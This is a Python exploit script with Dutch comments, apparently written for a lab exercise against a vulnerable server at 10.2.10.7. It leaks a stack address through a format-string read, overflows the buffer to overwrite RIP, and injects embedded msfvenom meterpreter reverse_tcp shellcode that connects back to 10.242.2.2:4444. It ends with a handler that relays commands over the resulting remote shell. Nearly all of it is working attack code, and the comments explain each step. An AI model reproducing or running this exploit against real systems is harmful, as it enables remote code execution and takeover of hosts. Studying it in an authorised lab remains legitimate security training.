import struct
import socket
import sys
import select

s = socket.socket()

# connect op de vulnerable applicatieserver. Daar moet je wel een socat gestart
# hebben op TCP/1337 met de applicatie.

s.connect(('10.2.10.7', 1337))

# standaard receive buffer

r = s.recv(1024)

# Stuur een message met bekende size (8 bytes en herkenbaar patroon)

message = ("%p,%p,%p\n")
s.send(message.encode('utf-8'))

# Vang de output op en stop bij de komma

while ',' not in r.decode('utf-8'):
    r = s.recv(1024)
    receive = r.decode('utf-8')
    print(receive)

# Het begin van de buffer is het geheugenadres van de crash min het aantal bytes
# van de message, 8 in ons geval (%p,%p,%p =8 bytes) plus een null byte voor het
# einde van een string. Dit is in totaal 9. Voor de berekening zetten we de
# stringwaarde eerst om naar decimaal om er dan 9 vanaf te trekken. In het print
# statement eronde geven we dmv 08x het resultaat weer in hex weer.

start_buf = int(receive.split(',')[1], 16)-9
print("leaked start of buffer: 0x{:08x}".format(start_buf))

# Deze input is om het programma even te laten wachten zodat je eventueel GDB
# nog kan starten op het juiste proces ID.

input('EXPLOIT?')

# padding is de hoeveelheid karakters die precies passen in de bufferruimte dit
# is vastgesteld door een grotere string te analyseren. Vanaf het geheugenadres
# waar de error op plaatsvindt is de string te lang. Het stuk daarvoor geeft precies de
# lengte van de buffer aan omdat elk karakter een byte is. Dit komt in dit geval
# uit op 264 bytes. Het geheugenadres van de crash is RIP. Je kunt de plek ook
# vaststellen door RSP uit te lezen oftwel de top of stack.

padding = b"dsuhagf ujkagsefjkygvasbjyfgvebaysufgvbeuaysbfvgajsyvbgjasyvbgfjkaysegvbfyjavbgfeyabvfgjyabvfyjagbvfyavbkjfeygvbaekjfygbvayesjgvbkajefvygbaejkyfgbaesyjbxreayksfugaskhjfedukasjfheasgv,ekirfaklsfgskaeifygdahs,fkjeuaskl.ejgfsajhfetgvasbkjfghevbafyutdlsfaekifgbsajkdua"

# shellcode = b"\xcc"*117 #Test shell code om buffer overflow te checken

# shellcode gegenereerd met msfvenom:
# msfvenom -p linux/x64/meterpreter/reverse_tcp --platform linux
# LHOST=10.242.2.2 LPORT=4444 -b "\x0a\x00\x41" -f python

shellcode = (
b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d"
b"\x05\xef\xff\xff\xff\x48\xbb\x0b\x92\xde\xa4\x17"
b"\x94\xf9\x0c\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
b"\xff\xe2\xf4\x3a\x6d\xb4\xad\x4f\x0d\x4f\x1c\x43"
b"\x1b\x08\xe9\x26\x5d\x93\x2e\x4a\xc8\xb4\xa3\x4d"
b"\x9b\xfc\x44\x8e\x52\xa6\xf5\x7d\x9e\xb8\x55\x5b"
b"\xf8\xf7\xfc\x8e\xfe\xfb\x53\x61\x93\x80\xab\x12"
b"\xdc\x7c\xcc\x73\xa9\x96\x33\x5f\x2d\xfb\x0c\x1a"
b"\xce\xd4\x56\x15\x96\xa8\x44\x82\x74\xb4\xb4\x4d"
b"\xfe\xd3\x54\x04\x97\x87\xec\x92\x54\x80\x29\x42"
b"\x6d\x17\xd0\x0f\xc3\x93\x2f\x53\xf8\xde\xce\x12"
b"\xdc\x70\xeb\x43\xa3\x28\xab\x12\xcd\xa0\x53\x43"
b"\x17\x1e\xdd\xd0\xfe\xc5\x54\x61\x93\x81\xab\x12"
b"\xca\x93\x72\x51\x9d\xdb\xec\x92\x54\x81\xe1\xf4"
b"\x74\xde\xa4\x17\x94\xf9\x0c"
)

# RIP is het adres voor de instruction pointer. Die staat aan: (het begin van de
# buffer + de lengte van de buffer + 8 bytes van het RIP adres zelf). Daar moet
# RIP naar wijzen. Het is het volgende adres, daar zetten we de shellcode neer.

RIP = struct.pack("Q", (start_buf+len(padding)+8))
print(RIP)

# De payload plus RIP waarde + de shellcode worden in geheugen geplaatst.

payload = padding + RIP + shellcode
s.send(payload)

# Hieronder staat een handler voor de reverse shell sessie die commando's opvangt,
# doorspeelt aan het OS en de replies weer terugstuurt.
# De handler maakt gebruik van de select module die op OS niveau wacht op
# input. De input van select bestaat uit 3 lists (input, output en
# error/exception). De input is een list van boodschappen die via de socket
# binnenkomen en standardinput die op de commandline binnenkomt. Dit laatste
# zijn commands die op de cli gegeven worden. Socket input wordt via sys met write
# weergegeven, stdin wordt gelezen en via de socket verstuurd.

while True:
    r, w, e = select.select([s, sys.stdin], [], [])
    if s in r:
        data = s.recv(1024)
        if not data:
            print("\nverbinding verbroken.")
            break
        sys.stdout.buffer.write(data)
        sys.stdout.flush()
    if sys.stdin in r:
        line = sys.stdin.readline()
        if not line:
            break
        s.sendall(line.encode())

